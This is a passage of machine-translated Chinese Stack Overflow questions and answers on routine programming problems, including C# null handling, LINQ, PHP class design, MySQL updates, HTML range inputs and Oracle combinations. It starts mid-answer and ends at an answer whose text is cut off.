为什么？从名字上看有点模棱两可，是的，它被命名为控制器，但你应该看看它背后是什么。

```
Mage_Adminhtml_Block_Widget_Grid_Container

protected function _prepareLayout()
{
    $this->setChild( 'grid',
        $this->getLayout()->createBlock( $this->_blockGroup.'/' . $this->_controller . '_grid',
        $this->_controller . '.grid')->setSaveParametersInSession(true) );
    return parent::_prepareLayout();
} 
```

您的容器将创建一个孩子（孩子是一个网格）：

`$this->getLayout()->createBlock( $this->_blockGroup.'/' . $this->_controller . '_grid', $this->_controller . '.grid')`

您之前的代码将创建：

`$this->getLayout()->createBlock( 'import/adminhtml_exporter_grid', 'adminhtml_exporter.grid')`

这是不正确的，应该是：

`$this->getLayout()->createBlock( 'exporter/adminhtml_import_grid', 'adminhtml_exporter.grid')`

因为你的网格是`World_Exporter_Block_Adminhtml_Import_Grid`

# c# - 将 null 转换为字符串的函数

> ID：12300744
> 
> 赞同：33
> 
> 时间：2012-09-06T13:02:14.500
> 
> 标签：c#, asp.net

我想创建一个函数来将任何空值例如从数据库转换为空字符串。我知道有诸如 if 之类的方法，`value != null ?? value : String.Empty`但是有没有办法传递`null`给方法，例如

```
public string nullToString(string? value)
{
    if(value == null) return empty;
    return value
} 
```

但我不确定执行此操作的参数语法..

我尝试了上述方法，但它说不是可以为空的类型。

提前致谢。

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-09-06T13:28:01.777

```
static string NullToString( object Value )
{

    // Value.ToString() allows for Value being DBNull, but will also convert int, double, etc.
    return Value == null ? "" : Value.ToString();

    // If this is not what you want then this form may suit you better, handles 'Null' and DBNull otherwise tries a straight cast
    // which will throw if Value isn't actually a string object.
    //return Value == null || Value == DBNull.Value ? "" : (string)Value;

} 
```

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2012-09-06T13:07:28.303

当您从数据库中获取 NULL 值时，返回的值是 DBNull.Value 在这种情况下，您可以简单地调用`.ToString()`它会返回`""`

例子：

```
 reader["Column"].ToString() 
```

如果返回`""`的值为`DBNull.Value`

如果场景并不总是数据库，那么我会选择扩展方法：

```
public static class Extensions
{

    public static string EmptyIfNull(this object value)
    {
        if (value == null)
            return "";
        return value.ToString();
    }
} 
```

用法：

```
string someVar = null; 
someVar.EmptyIfNull(); 
```

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2014-03-14T18:00:01.277

[`Convert.ToString(object)`](https://msdn.microsoft.com/en-us/library/system.convert.tostring(v=vs.110).aspx)转换为字符串。如果对象是`null`，`Convert.ToString`则将其转换为空字符串。

调用[`.ToString()`](https://msdn.microsoft.com/en-us/library/system.object.tostring(v=vs.110).aspx)具有 null 值的对象会引发[`System.NullReferenceException`](https://msdn.microsoft.com/en-us/library/system.nullreferenceexception%28v=vs.110%29.aspx?f=255&MSPPError=-2147217396).

编辑：

规则的两个例外：

1)`ConvertToString(string)`对空字符串将始终返回空值。

2)`ToString(Nullable<T>)`在 null 值上将返回 "" 。

代码示例：

```
// 1) Objects:

object obj = null;

//string valX1 = obj.ToString();           // throws System.NullReferenceException !!!
string val1 = Convert.ToString(obj);    

Console.WriteLine(val1 == ""); // True
Console.WriteLine(val1 == null); // False

// 2) Strings

String str = null;
//string valX2 = str.ToString();    // throws System.NullReferenceException !!!
string val2 = Convert.ToString(str); 

Console.WriteLine(val2 == ""); // False
Console.WriteLine(val2 == null); // True            

// 3) Nullable types:

long? num = null;
string val3 = num.ToString();  // ok, no error

Console.WriteLine(num == null); // True
Console.WriteLine(val3 == "");  // True
Console.WriteLine(val3 == null); // False 

val3 = Convert.ToString(num);  

Console.WriteLine(num == null);  // True
Console.WriteLine(val3 == "");  // True
Console.WriteLine(val3 == null); // False 
```

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2012-09-06T13:05:50.833

您可以只使用空合并运算符。

```
string result = value ?? ""; 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2016-07-11T11:49:36.693

使用 C# 6 可以使它更短：

```
public string NullToString(string value)
{
    return value?.ToString() ?? string.empty;
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-05-22T06:21:42.250

**1.字符串.格式**

您可以使用`string.Format`which 将 null 转换为空字符串

```
string nullstr = null;
string  quotestring = string.Format("{0}", nullstr);
Console.WriteLine(quotestring);//Output- "" 
```

**2.字符串插值**

或者您可以使用`string interpolation.`C# 6 及更高版本中提供的此功能。

InterpolatedExpression 生成要格式化的结果。空结果的字符串表示形式是`String.Empty`。

```
 string nullstr = null;
 string  quotestring = $"{nullstr}";
 Console.WriteLine(quotestring);//Output- "" 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-06-25T19:49:38.783

有时我只是将一个空字符串附加到一个可能为空的对象上。

```
object x = null;
string y = (x + "").ToString(); 
```

这永远不会抛出异常，并且如果为 null 并且不需要 if then 逻辑，则始终返回一个空字符串。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-10-21T14:56:12.390

你可以使用 ??"" 例如：

```
y=x??"" 
```

如果 x 不为空 y=x 但如果 x 为空 y=""

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2017-05-28T12:54:25.300

可以使用“？”。（空条件成员访问）带有“??” （空合并运算符）像这样：

```
public string EmptyIfNull(object value)
{
    return value?.ToString() ?? string.Empty;
} 
```

这个方法也可以写成对象的扩展方法：

```
public static class ObjectExtensions
{
    public static string EmptyIfNull(this object value)
    {
        return value?.ToString() ?? string.Empty;
    }
} 
```

您可以使用“=>”（lambda 运算符）编写相同的方法：

```
public string EmptyIfNull(object value)
    => value?.ToString() ?? string.Empty; 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-08-12T14:12:59.107

您可以使用`Convert.ToString((object)value)`. 您需要先将值转换为对象，否则转换将导致 null。

```
using System;

public class Program
{
    public static void Main()
    {
        string format = "    Convert.ToString({0,-20}) == null? {1,-5},  == empty? {2,-5}";
        object nullObject = null;
        string nullString = null;

        string convertedString = Convert.ToString(nullObject);
        Console.WriteLine(format, "nullObject", convertedString == null, convertedString == "");

        convertedString = Convert.ToString(nullString);
        Console.WriteLine(format, "nullString", convertedString == null, convertedString == "");

        convertedString = Convert.ToString((object)nullString);
        Console.WriteLine(format, "(object)nullString", convertedString == null, convertedString == "");

    }
} 
```

给出：

```
Convert.ToString(nullObject          ) == null? False,  == empty? True 
Convert.ToString(nullString          ) == null? True ,  == empty? False
Convert.ToString((object)nullString  ) == null? False,  == empty? True 
```

如果将 System.DBNull.Value 传递给 Convert.ToString() ，它也会被转换为空字符串。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2012-09-06T13:05:48.447

```
public string nullToString(string value)
{
    return value == null ?string.Empty: value;   
} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-01-16T13:25:45.417

```
 public string ToString(this string value)
        {
            if (value == null)
            {
                value = string.Empty;
            }               
            else
            {
                return value.Trim();
            }
        } 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-08-02T09:34:33.357

您可以使用 null-coalescing-operator C# 8.0 及更高版本

值 ??=string.Empty;

[??= 运算符](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/operators/null-coalescing-operator)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-11-24T15:56:13.997

这是一个古老的话题，但有一种“优雅”的方式可以做到这一点......

```
static string NullToString( object Value )
{       
    return Value = Value ?? string.Empty;    
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2018-06-30T12:03:15.843

你可以试试这个

```
public string ToString(this object value)
{
    // this will throw an exception if value is null
    string val = Convert.ToString (value);

     // it can be a space
     If (string.IsNullOrEmpty(val.Trim()) 
         return string.Empty:
}
    // to avoid not all code paths return a value
    return val;
} 
```

* * *

## 回答 #16

> 赞同：-3
> 
> 时间：2020-07-09T10:40:25.260

根据以下[MSDN 页面](https://docs.microsoft.com/en-us/dotnet/api/system.convert.tostring?view=netcore-3.1)，您需要该`Convert.ToString`方法

```
string x = Convert.ToString((object)value) 
```

# c# - 'System.UnauthorizedAccessException' 从 Metro 的已安装位置读取文件时

> ID：12300746
> 
> 赞同：0
> 
> 时间：2012-09-06T13:02:20.977
> 
> 标签：c#, windows-8

我正在遵循[此链接](https://stackoverflow.com/questions/11705866/how-to-read-a-file-shipped-with-the-app-in-windows-8-metro)中提供的步骤。但是我在读取文件（文本文件）时收到“System.UnauthorizedAccessException”；我也尝试了以下解决方案，但没有成功。

```
StorageFile file = await StorageFile.GetFileFromApplicationUriAsync(new Uri("ms-appx:///ewr.txt", UriKind.RelativeOrAbsolute));
 IRandomAccessStream stream = await file.OpenAsync(FileAccessMode.Read); 
```

请告诉我锄头来解决它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:25:54.763

尝试以管理员权限运行代码。您的应用程序正在尝试访问默认受限制的位置。另一种选择是将文件存储在登录用户可以访问的位置，即用户的应用程序数据文件夹。

问题不在于您的代码，而在于文件的有效访问权限。但是，您可以通过更改代码来解决它。

# c# - LINQ 选择取决于内部集合值

> ID：12300751
> 
> 赞同：3
> 
> 时间：2012-09-06T13:02:32.380
> 
> 标签：c#, linq, select, collections

我有这段代码：

```
public string Label { get; set; }

public bool IsSpoon(out Spoon sp) 
{
    sp = null;
    foreach (Tool t in Tools.GetAllItems())
        if ((sp = t.AllSpoons.FirstOrDefault(x => x.Label == this.Label)) != null)
            break;

    return sp != null;
} 
```

如何通过 LINQ 对其进行优化？

我想到了这样的事情，但这是不允许的：

```
public string Label { get; set; }

public bool IsSpoon(out Spoon sp) 
{
    return Tools.GetAllItems().FirstOrDefault(x => (sp = x.AllSpoons.FirstOrDefault(y => y.Label == this.Label)) != null) != null;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:17:49.007

[您可以使用SelectMany](http://msdn.microsoft.com/en-us/library/bb534336.aspx)展平列表。然后，您不必做任何棘手的事情，例如在 LINQ 语句的中间赋值。

```
public bool IsSpoon(out Spoon sp) 
{
    sp = Tools.GetAllItems().SelectMany(t => t.AllSpoons)
                            .FirstOrDefault(x => x.Label == this.Label);
    return sp != null;
} 
```

这是本质上等效的查询语法：

```
sp = (from tool in Tools.GetAllItems()
      from spoon in tool.AllSpoons
      where spoon.Label == this.Label
      select spoon).FirstOrDefault(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T13:06:21.050

**编辑：**我没有注意到`sp`参数，这是一个更新：

```
sp = Tools
    .GetAllItems()
    .SelectMany(x => x.AllSpoons)
    .FirstOrDefault(y => y.Label == this.Label);
return sp != null; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:05:17.497

```
public bool IsSpoon(out Spoon sp) 
{ 
    return Tools.GetAllItems()
        .SelectMany(t => t.AllSpoons)
        .Any(x => x.Label == this.Label);
} 
```

# r - 如何从 netcdf 文件写入二进制文件？

> ID：12300752
> 
> 赞同：0
> 
> 时间：2012-09-06T13:02:39.223
> 
> 标签：r, binary

我想从 netcdf 文件写一个二进制文件

```
library(ncdf)
download.file("http://gswp/Fixed/SoilDepth.nc", destfile="SoilDepth.nc")
soil <- open.ncdf("SoilDepth.nc")
soil$var[[3]] -> var3 
get.var.ncdf(soil, var3) -> SoilDepth
download.file("http://gswp/Fixed/landmask_gswp.nc", destfile="landmask.nc")
landmask <- open.ncdf("landmask.nc")
landmask$var[[3]] -> varland
get.var.ncdf(landmask, varland) -> land
land = t(land)
land[land==1] <- SoilDepth
land[land==0] <- NA
land = t(land)
image(land) 
```

此代码的结果将如下所示：![map of soil][1]

现在我想将它写入一个二进制文件：

结果是图像颠倒了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T11:50:56.873

您自己请求反向定向，通过指定`ylim=c(1,0)`. 只需将最后一行更改为

```
image(y) 
```

你会没事的，因为双转置除了吃资源什么都不做。

*更多信息：*原始数据和重读数据之间的唯一区别是后者`NaN`在前者有（不可用）的地方有（即不是数字`NA`）。撤消此修改会产生完全相同的数据：

```
y[is.nan(y)] <- NA 
```

在此之后，`y`变得无法区分`land`。

# java - 用tomcat执行web应用

> ID：12300755
> 
> 赞同：0
> 
> 时间：2012-09-06T13:02:45.973
> 
> 标签：java, jsp, tomcat, servlets, profiling

我已经开始使用 tomcat 7 几天了。我试过用它执行许多基于 JAVA 的 Web 应用程序。我实际上想检查基于 java 的 Web 应用程序的流程。这意味着 Web 应用程序的方法按什么顺序执行。为此，我使用 java profiler 分析 tomcat 服务器。

我的分析器是这样工作的：

1.  我将应用程序的war文件部署到tomcat的web Apps目录中。
2.  我启动服务器`./startup.sh`
3.  我在浏览器中访问应用程序并执行它。
4.  我停止服务器`./shutdown.sh`。

在我停止服务器后，分析器以 xml 格式转储输出（它将方法的层次结构显示为调用上下文树）。（我的分析器基本上分析了 java 类的方法。）

如您所知，可能是因为 Tomcat 基于 servlet，对于应用程序的 2 次完全相同的运行（我按照上述 4 个步骤进行了 2 次，并且对于 2 次相同的运行有 2 个不同的输出），分析器给出了不同的输出。**Q.1）我不完全知道为什么会发生这种情况，我很想知道它背后的原因。**

即使对于简单的应用程序，输出也非常大（大约 200 MB）。为了限制输出的大小并为 2 次完全相同的运行提供相同的输出，我从分析中排除了 org.apache.* 的方法。因为我最终对了解 Web 应用程序本身的流程感兴趣。（了解 Web 应用程序的哪些顺序方法被执行）。对于这种情况，我有以下问题。

**Q.2）**通过部署war文件运行应用程序并通过从目录本身获取它来运行它可以对分析器的输出产生影响？还是会影响它们在这两种情况下执行的一系列方法？

**Q.3)**我想知道当我执行应用程序的jsp页面时会发生什么？我的意思是tomcat如何执行它们？请明智地...

**Q.4)**当我在执行应用程序后检查分析器的输出时，我看到没有大量来自 org/eclipse/jdt/internal/... 的方法被执行。那么这些类实际上是做什么的呢？为什么我的输出中有它们？

如果我未能解释我的问题，请告诉我。我搜索了很多，但找不到我的问题的非常准确的答案。

我真的很感谢你的回复..

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:20:13.877

我强烈建议阅读一些关于 tomcat 作品的信息。简而言之

**Q.2**应该没有任何区别。

**Q.3** JSP 在被调用时被编译为 servlet 类。如果 JSP 中没有 Servlet 类，则 tomcat 制作一个。如果有对应的servlet类，tomcat看哪个更年轻，是JSP还是servlet。如果 JSP 更年轻，它会进行新的编译，否则使用 servlet。

**Q.1**不确定。可能是多线程/定时的事情，也许这是您的探查器的工作方式。

**Q.4**不确定。可以是您的 servlet 代码使用的分析器或库中的类吗？

**编辑**：对于**Q.4**，请查看 Ian Roberts 对问题的评论。

你用什么分析器？如何通过调试逐步完成代码？

# php - 单例、传递对象、使用静态、返回错误或全局变量？

> ID：12300756
> 
> 赞同：2
> 
> 时间：2012-09-06T13:02:56.373
> 
> 标签：php, oop, static, singleton, global-variables

我知道，全局变量不是 (;

我是 OOP 的新手，我正在将我创建的一些函数重构为类，但我遇到了一个问题。我的一些类是从用户输入的页面本身调用的（例如：）`$Link->create('page/to/go');`。由于这是在任何类之外，所以没有问题，链接被创建。

但是，我有一个类在创建时尝试登录用户，如果输入的电子邮件不在数据库中，它会将用户重定向到注册页面。显然，只做`header ('Location '.$Link->create('page/to/go')`) 是行不通的。

我要做的是将`create`方法设置为*静态*，然后从任何地方调用它。但我认为这类似于使用全局变量，我正在尝试纠正坏习惯。那么我该怎么做呢？

这是该类的一些代码，实现了我[在此处](https://stackoverflow.com/questions/6117589/apache-rewrite-for-404-getting-the-requested-url/12134131#12134131)`Link`解释的 404 检测：

```
class Link
  {
  private function valid($check)
    {
    $exceptions=array("help/report", "translate");  // More pages and rules to be added
    return in_array($check,$exceptions);
    }

  public function create($arg)
    {
      if (!file_exists("/path/to/".$arg) && !$this->valid($arg))
      {
      // Call a function to store the error in a database.
      error ("404 for ".$arg);

      // One way of handling it. Replace '/' for ' ' and google that string in this page.
      $arg=str_replace("/","%20",$arg);
      return "https://www.google.com/#q=site%3A".Configuration::get('BaseUrl')."%20".$arg;
      }
    else
      {
      // If the page exists or is an exception, create the normal link.
      if(empty($arg)) return Configuration::get('BaseUrl');
      else return Configuration::get('BaseUrl').$arg;
      }
    }
  } 
```

正如您在代码中看到的，当我在一个类中实现 error() 时，我会遇到类似的问题。

我刚刚想到的一个选项是我可能想要返回一个错误并从 User 类的 __construct() 之外解析它。但它只适用于此，因为它是“是/不是”，而且我认为制作错误代码不适用于其他情况。

那么，对于将属性和方法从一个类传递给其他类的建议是什么？可以`static`用于这种情况吗？

编辑。我的问题的难点在于，我见过的几乎所有书籍、教程、页面等都在谈论如何创建一个单一的课程。我还没有看到任何深入解释类应该如何相互交谈。

编辑 2\. 根据评论中的要求，这里还有更多代码。用户只输入电子邮件（获得 1 级）访问他的课程，而用户只有在设置页面中获得 2 级时才能编辑他的设置。还没完，我会放更多的方法。

```
class User
  {
  private $Email;
  private $Name;

  public function __construct()
    {
    if (!empty($_POST['logout'])) session_destroy();
    else if ( !empty($_POST['email']) )
      {
      $this->loginEmail($_POST['email']);
      }
    else if ( $_SESSION['level'] == 1 )
      {
      if (!empty($_POST['password']))
        {
        $this->loginFull($_SESSION['email'],$_POST['password']);
        }
      else
        {
        $this->loginEmail($_SESSION['email']);
        }
      }
    else if ( $_SESSION['level'] == 2 )
      {
      $this->loginFull($_SESSION['email'],$_SESSION['pass']);
      }
    else session_destroy();

    }

  private function loginEmail($Email)
    {
    $sql=mysql_query("SELECT * FROM users WHERE email='".mysql_real_escape_string($Email)."'");  //Retrieve the entries from the database
    $row=mysql_fetch_assoc($sql);
    if(mysql_num_rows($sql)==1)
      {
      $this->getData($row);
      $_SESSION['level']=1;
      }
    else header ('Location: http://example.org/new/student/');
    }

  private function loginFull($Email,$Pass)
    {
    $sql=mysql_query("SELECT * FROM users WHERE email='".mysql_real_escape_string($Email)."' AND pass='".md5($Pass)."'");  //Retrieve the entries from the database
    $row=mysql_fetch_assoc($sql);
    if(mysql_num_rows($sql)==1)
      {
      $this->getData($row);
      $_SESSION['pass']=$Pass;
      $_SESSION['level']=2;
      }
    else $this->loginEmail($Email);
    }

  private function getData($row)
    {
    $_SESSION['email']=$row['email'];
    $this->Email=$row['email'];
    $this->Name=$row['name'];
    }

  public function get($Var)
    {
    return $this->$Var;
    }
  } 
```

现在上课了`Error`。正如你所看到的，我已经执行了一些 DI，甚至不知道这里。

```
class Error
  {
  private $Page;
  private $Language;
  private $User;

  public function __construct($Page,$Language,$User="None")
    {
    $this->Page=$Page;
    $this->Language=$Language;
    $this->User=$User;

    if (!empty($_REQUEST['banner']))
      $this->Banner=$_REQUEST['banner'];
    }

  public function add($Kind)
    {
    if (!mysql_query("INSERT INTO error (kind, page, lang, user, version, date) VALUES ('".mysql_real_escape_string($Kind)."', '".mysql_real_escape_string($this->Page)."', '".mysql_real_escape_string($this->Language)."', '".mysql_real_escape_string($this->User)."', '".Configuration::get('Version')."',NOW() )"))

    mail(Configuration::get('ErrorEmail'), "Error '".$Kind."' that couldn't be stored.",
       "Full url: ".$FullUrl."\n Language: ".$this->Language->Lang."\n User: ".$Identif."\n Version: ".$Version);  // Inform of the error by email
    }
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:20:00.483

创建 Link 类的实例并将其传递到需要的位置（使用 setter 或构造函数）。一定要阅读有关 DI（依赖注入）和 DI Containers 的内容。

[Nette 框架](http://doc.nette.org/en/dependency-injection)中很好的介绍- 依赖注入

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:22:18.973

单例和静态不是一个好的选择。最后一切都落到了全局问题上。

您应该`link helper`通过构造函数或设置器（如@jasir 所说的DI）将您的注入到类中。

如果您要重定向用户，您还可以注入`redirector helper`：

`$redirector->redirect('controller','action', array('my','params'));`

> 提示：这也很糟糕`Configuration::get()`。而是注入配置。
> 永远记住：[不要找东西！](http://www.youtube.com/watch?v=RlfLCWKxHJ0)

# c# - 将图表分成 4 个部分

> ID：12300758
> 
> 赞同：0
> 
> 时间：2012-09-06T13:03:07.310
> 
> 标签：c#, grid, diagram

嗨，我想将我的图表分成四个部分。我如何定义其他 3 个边界。

```
Rect b = activeDiagram.Panel.DiagramBounds; // b = (-370, -190, 3099, 2450)
Rect bounds1 = new Rect((new System.Windows.Point(b.X,b.Y)), (new System.Windows.Point( (w/2) + b.X, (h/2) + b.Y ))); // bounds1 = (-370, -190, 1549.5, 1225) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:24:44.560

考虑到您想从图表边界中获得 4 个相等的矩形，`w`并且`h`在您的示例中是宽度和高度，您可以使用以下代码：

```
Rect bounds1 = new Rect(b.X, b.Y, w/2, h/2); //top left corner
Rect bounds2 = new Rect(b.X, b.Y + h/2, w/2, h/2); //bottom left corner
Rect bounds3 = new Rect(b.X + w/2, b.Y, w/2, h/2); //top right corner 
Rect bounds4 = new Rect(b.X + w/2, b.Y h/2, w/2, h/2); //bottom right corner 
```

# php - 如何 UPDATE mysql 行加一并获取值

> ID：12300763
> 
> 赞同：0
> 
> 时间：2012-09-06T13:03:28.230
> 
> 标签：php, mysql

我更新成功

```
 $result = mysql_query("UPDATE $table SET `queue2` = `queue2` + 1 WHERE `id` = '$getid'"); 
```

但是如何在不向 MySQL 发起新请求的情况下获得“queue2”值

我可以使用此命令简单地获取新值

```
$selresult = mysql_query("SELECT * FROM $table WHERE `id` = '$getid'") or die(mysql_error()); 
```

但我担心数据库会再次获得新的更新，我会得到更高的数字

知道怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:06:25.967

您需要在查询之间使用事务来确定。

交易文档[在这里](http://dev.mysql.com/doc/refman/5.0/en/commit.html)。一个很好的 SO 问题，详细介绍了它：[PHP + MySQL 事务示例](https://stackoverflow.com/questions/2708237/php-mysql-transactions-examples)

编辑：

换个角度看，为什么不反过来呢？它可能会节省对事务的需求（认为您可能会在写入之前获得多次读取）：

从这里获取`queue2`要在页面中显示的值的值：

```
mysql_query("SELECT * FROM $table WHERE `id` = '$getid'"); 
```

您现在拥有真正的价值，因此您可以运行：

```
$result = mysql_query("UPDATE $table SET `queue2` = `queue2` + 1 WHERE `id` = '$getid'"); 
```

没有交易，您知道更新前数据的价值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:05:31.883

见网址：-

[PHP + MySQL 事务示例](https://stackoverflow.com/questions/2708237/php-mysql-transactions-examples)

尝试这个：-

```
printf ("Updated records: %d\n", mysql_affected_rows());
mysql_query("COMMIT"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:07:53.417

您可以使用查询来更新值。

```
mysql_query("UPDATE user_profile SET userpoints = userpoints + 1 WHERE user_id = '".$user_id."'"); 
```

# html - html 输入范围步骤作为值数组

> ID：12300767
> 
> 赞同：8
> 
> 时间：2012-09-06T13:03:31.660
> 
> 标签：html, html-input

我`input type=range`第一次玩这个，理想情况下我想将 step 值设置为一个值数组。我查看了规范，我看到了数据列表的可能性，但它接缝数据列表仅用于突出显示范围内的值，可以这么说，但不设置范围内的值。

所以，像这样（理想情况下没有 jQuery 插件等）：

```
<input type="range" min="1" max="100" value="0" step="1,3,5,10,20"> 
```

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2015-07-29T22:45:58.327

您可以通过将值存储在数组中并将滑块用作数组的索引器来实现此目的。此示例将在您滑动时逐步执行 1、3、5、10、20、50、100。

HTML

```
<input id="input" type="range" min="0" value="0" max="6" step="1">
<div id="output"></div> 
```

JS

```
var values = [1,3,5,10,20,50,100];    //values to step to

var input = document.getElementById('input'),
   output = document.getElementById('output');

input.oninput = function(){
    output.innerHTML = values[this.value];
};
input.oninput(); //set default value 
```

小提琴：http: [//jsfiddle.net/26xk026z/1/](http://jsfiddle.net/26xk026z/1/)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2019-01-29T12:10:04.993

Karmacon 的答案工作得很好，但不要忘记将属性添加`aria-valuetext`到输入元素。它将帮助屏幕阅读器读出正确的值。

MDN 提供了一个很好的例子： [https ://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Techniques/Using_the_slider_role#Example_2_Text_Values](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Techniques/Using_the_slider_role#Example_2_Text_Values)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-07-23T11:42:45.853

有下一个输入：

```
 <input id="currentTimeInput" type="range" value="1" min="0" max="60" oninput="toggleSteps(this);" list=mapsettings>
    <datalist id=mapsettings>
        <option>0</option>
        <option>1</option>
        <option>2</option>
        <option>3</option>
        <option>4</option>
        <option>5</option>
        <option>6</option>
        <option>7</option>
        <option>8</option>
        <option>9</option>
        <option>10</option>
        <option>20</option>
        <option>30</option>
        <option>40</option>
        <option>50</option>
        <option>60</option>
    </datalist> 
```

这是我将步骤更改为 1 (0-10) 和 10 (10-60) 的功能

```
function toggleSteps(element) {
    var minutes = parseInt(element.value);
    if (minutes > 10) {
        element.step = 10;
    } else {
        element.step = 1;
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-06T13:33:52.363

根据[W3C 规范](https://www.w3.org/TR/html5/forms.html#concept-input-step-scale)，step 的值可以是“任意”或正浮点数。而已。

> step 属性（如果指定）必须具有一个值，该值是一个解析为大于零的数字的有效浮点数，或者必须具有一个与字符串“any”匹配且不区分大小写的 ASCII 值.

# database - 如何在 Oracle 中生成排列？

> ID：12300774
> 
> 赞同：1
> 
> 时间：2012-09-06T13:03:52.793
> 
> 标签：database, oracle, oracle10g, oracle11g, permutation

在 Oracle 中，我有一个对象类型表。

我想在 ITEM_PURPOSE_CODE 上生成所有排列。

该表如下所示：

```
ITEM_PURPOSE_CODE  ITEM_CATEGORY_ID  ITEM_ID
==========================================
1                  101                50
2                  202                94
2                  202                95 
```

我想要的是生成一堆表示排列的表类型，例如：

```
ITEM_PURPOSE_CODE  ITEM_CATEGORY_ID  ITEM_ID
==========================================
1                  101                50
2                  202                94 
```

和

```
ITEM_PURPOSE_CODE  ITEM_CATEGORY_ID  ITEM_ID
==========================================
1                  101                50
2                  202                95 
```

显然这是一个非常简单的案例。可以有任意数量的项目用途代码（1 到 n），并且这些代码可以针对不同的项目类别 ID/项目 ID 重复任意次数。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-01-09T13:18:39.700

请在此处找到生成组合的解决方案。这是我们之前在房地产开发软件中遇到的问题的一个很好的变体。

# 创建和填充数据模型

首次设置：

```
create table contents
( item_purpose_code number
, item_category_id  number
, item_id           number
)
/
begin
  insert into contents values (1, 101, 50);
  insert into contents values (2, 202, 94);
  insert into contents values (2, 202, 95);
  commit;
end;
/ 
```

# 辅助视图

首先，我创建一些视图。但当然你也可以内联它们或使用`with`.

```
--
-- Add to each row the consecutive number of the driver columns
-- (here only item_purpose_code) and for each different value
-- for the driver columns a consecutive number that restarts
-- when a new driver column value starts.
--
create or replace force view sequencedrows
as
select item_purpose_code
,      item_category_id
,      item_id
,      dense_rank() 
       over 
       ( order 
         by        item_purpose_code
       ) driver_seq 
,      row_number() 
       over 
       ( partition 
         by        item_purpose_code 
         order 
         by        item_category_id
         ,         item_id 
       ) 
       values_per_driver_seq
from   contents
/
--
-- Generate list of combinations.
-- 
create or replace force view combinations
as
select  sys_connect_by_path (driver_seq || '-' || values_per_driver_seq, '#') || '#' combination
from    sequencedrows
where   level = ( select max(driver_seq) from sequencedrows )
start 
with    driver_seq = 1
connect 
by  
nocycle driver_seq  = prior driver_seq + 1
/ 
```

有了这些，它变得非常简单，因为组合已经包含在字段中`combination`并且行已经编号：

```
select c.combination
,      s.item_purpose_code
,      s.item_category_id
,      s.item_id
from   combinations c
join   sequencedrows s
on     c.combination like '%#' || to_char(s.driver_seq) || '-' || to_char(s.values_per_driver_seq) || '#%'
order
by     c.combination
,      s.driver_seq
,      s.values_per_driver_seq
/ 
```

结果是：

```
#1-1#2-1#  1  101  50
#1-1#2-1#  2  202  94

#1-1#2-2#  1  101  50
#1-1#2-2#  2  202  95 
```

# 表现

根据数据量和索引，性能可能不足以进行交互使用。然而，在我们的房地产开发包中，我们发现自 Oracle 11g 以来，即使生成了 50K 行，性能也是可以接受的。Oracle 10g 在优化方面做得不太理想。

当您的站点的性能不可接受时，请列出一些关键统计数据或添加重现场景。

# android - ACTION_SEND Intent 的 Google Plus 客户端类

> ID：12300775
> 
> 赞同：0
> 
> 时间：2012-09-06T13:03:56.467
> 
> 标签：android, twitter, client, google-plus

我使用此代码在 Twitter 上实现了发帖

```
Intent sharingIntent = new Intent(Intent.ACTION_SEND);
        sharingIntent.setClassName("com.twitter.android", "com.twitter.android.PostActivity");
        sharingIntent.putExtra(Intent.EXTRA_TEXT, msg);
        startActivity(sharingIntent); 
```

现在我正在考虑为 Google+ 做同样的事情，但我找不到它的类/包。有谁知道它是哪一个或找到它的方法？谢谢！:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T13:10:53.547

试试这个。

```
Intent shareIntent = ShareCompat.IntentBuilder.from(ShareActivity.this)
   .setText("This site has lots of great information about Android!
      http://www.android.com")
   .setType("text/plain")
   .getIntent()
   .setPackage("com.google.android.apps.plus");

startActivity(shareIntent); 
```

[在这里](http://googleplusplatform.blogspot.in/2012/05/sharing-rich-content-from-your-android.html)查看更多详情。

# google-apps-script - 在 Apps 脚本中确定当前用户

> ID：12300777
> 
> 赞同：12
> 
> 时间：2012-09-06T13:04:08.120
> 
> 标签：google-apps-script, google-sheets

我正在尝试识别当前用户的姓名，以记录谁编辑了这样的内容：

```
 r.setComment("Edit at " + (new Date()) + " by " + Session.getActiveUser().getEmail()); 
```

但它不起作用 - 用户名是一个空字符串。我哪里做错了？

* * *

## 回答 #1

> 赞同：18
> 
